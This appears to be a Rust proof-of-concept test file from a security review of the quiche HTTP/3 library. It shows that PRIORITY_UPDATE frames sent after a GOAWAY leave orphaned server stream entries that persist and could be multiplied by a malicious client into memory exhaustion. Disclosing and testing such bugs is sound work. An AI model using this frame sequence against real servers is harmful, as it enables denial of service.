// Finding 9: GOAWAY + PRIORITY_UPDATE race — orphaned stream state
//
// Demonstrates that PRIORITY_UPDATE frames for stream IDs above the
// GOAWAY limit create orphaned H3 stream entries that are never cleaned up.
//
// Add to quiche/src/h3/mod.rs tests section or run standalone:
//   cargo test --package quiche --lib h3::tests::goaway_priority_update_creates_orphaned_state --nocapture

use crate::h3;
use crate::h3::testing;
use crate::h3::frame;

/// Demonstrates that PRIORITY_UPDATE creates stream entries for IDs above GOAWAY.
#[test]
fn goaway_priority_update_creates_orphaned_state() {
    let mut s = testing::Session::new().unwrap();
    s.handshake().unwrap();

    // Step 1: Send a normal request to establish stream 0
    let (stream, req) = s.send_request(true).unwrap();
    assert_eq!(stream, 0);

    let ev = s.server.poll(&mut s.pipe.server).unwrap();
    assert_eq!(ev, (stream, h3::Event::Headers { list: req, more_frames: false }));

    // Step 2: Server sends GOAWAY with stream_id = 4
    // This tells the client: "don't open any NEW streams with ID >= 4"
    s.server.send_goaway(&mut s.pipe.server, 4).unwrap();
    s.advance().ok();

    // Client receives the GOAWAY
    let ev = s.client.poll(&mut s.pipe.client).unwrap();
    assert_eq!(ev, (4, h3::Event::GoAway));

    // Step 3: Count existing H3 stream entries on the server
    let streams_before = s.server.streams.len();
    eprintln!("H3 streams before PRIORITY_UPDATE: {}", streams_before);

    // Step 4: Client sends PRIORITY_UPDATE for stream IDs ABOVE the GOAWAY limit
    // These streams should never be opened (GOAWAY says stop at 4)
    // but the server will create H3 stream entries for them anyway
    let orphaned_stream_ids: Vec<u64> = (2..20).map(|i| i * 4).collect(); // 8, 12, 16, 20, ...

    for &sid in &orphaned_stream_ids {
        let priority_frame = frame::Frame::PriorityUpdateRequest {
            prioritized_element_id: sid,
            priority_field_value: b"u=3".to_vec(),
        };

        // Send PRIORITY_UPDATE from client to server
        match s.send_frame_client(priority_frame, s.pipe.client.streams.peek_uni_next().unwrap_or(2), false) {
            Ok(_) => {},
            Err(e) => {
                eprintln!("Failed to send PRIORITY_UPDATE for stream {}: {:?}", sid, e);
                continue;
            }
        }
    }

    // Process all frames on the server
    loop {
        match s.server.poll(&mut s.pipe.server) {
            Ok((sid, h3::Event::PriorityUpdate)) => {
                eprintln!("Server got PriorityUpdate for stream {}", sid);
            },
            Ok((sid, ev)) => {
                eprintln!("Server got event for stream {}: {:?}", sid, ev);
            },
            Err(h3::Error::Done) => break,
            Err(e) => {
                eprintln!("Server poll error: {:?}", e);
                break;
            }
        }
    }

    // Step 5: Count H3 stream entries after PRIORITY_UPDATE
    let streams_after = s.server.streams.len();
    eprintln!("H3 streams after PRIORITY_UPDATE: {}", streams_after);
    eprintln!("Orphaned entries created: {}", streams_after - streams_before);

    // The bug: entries were created for streams above GOAWAY ID
    if streams_after > streams_before {
        eprintln!(
            "\nBUG CONFIRMED: {} orphaned H3 stream entries created for stream IDs \
             above GOAWAY limit (4). These will never be opened or cleaned up.",
            streams_after - streams_before
        );

        // These entries represent a memory leak proportional to the
        // number of PRIORITY_UPDATE frames a malicious client sends
    }
}

/// Shows that the orphaned entries persist indefinitely — no cleanup mechanism.
#[test]
fn goaway_orphaned_streams_never_collected() {
    let mut s = testing::Session::new().unwrap();
    s.handshake().unwrap();

    // Server sends GOAWAY immediately (stream ID 0 = no new streams)
    s.server.send_goaway(&mut s.pipe.server, 0).unwrap();
    s.advance().ok();

    // Client receives GOAWAY
    let _ = s.client.poll(&mut s.pipe.client);

    let streams_before = s.server.streams.len();

    // Client sends PRIORITY_UPDATE for stream 4 (above GOAWAY = 0)
    let priority_frame = frame::Frame::PriorityUpdateRequest {
        prioritized_element_id: 4,
        priority_field_value: b"u=0".to_vec(),
    };

    // We need to send on the client's control stream
    // The PRIORITY_UPDATE is sent on the control stream (unidirectional)
    let _ = s.send_frame_client(
        priority_frame,
        // Use the control stream that was already established
        2, // Client uni stream 2 (first client-initiated uni = control)
        false,
    );

    // Process on server
    loop {
        match s.server.poll(&mut s.pipe.server) {
            Ok(_) => continue,
            Err(h3::Error::Done) => break,
            Err(_) => break,
        }
    }

    let streams_after = s.server.streams.len();

    // Advance the connection many times — orphaned state should persist
    for _ in 0..100 {
        let _ = s.advance();
        loop {
            match s.server.poll(&mut s.pipe.server) {
                Ok(_) => continue,
                Err(_) => break,
            }
        }
    }

    let streams_final = s.server.streams.len();
    eprintln!("Streams: before={}, after_priority={}, after_100_advances={}",
        streams_before, streams_after, streams_final);

    if streams_after > streams_before {
        // The orphaned entries still exist after 100 advance cycles
        assert_eq!(
            streams_final, streams_after,
            "Orphaned stream entries should persist (no cleanup mechanism)"
        );
        eprintln!(
            "CONFIRMED: {} orphaned entries persist indefinitely with no cleanup.",
            streams_final - streams_before
        );
    }
}
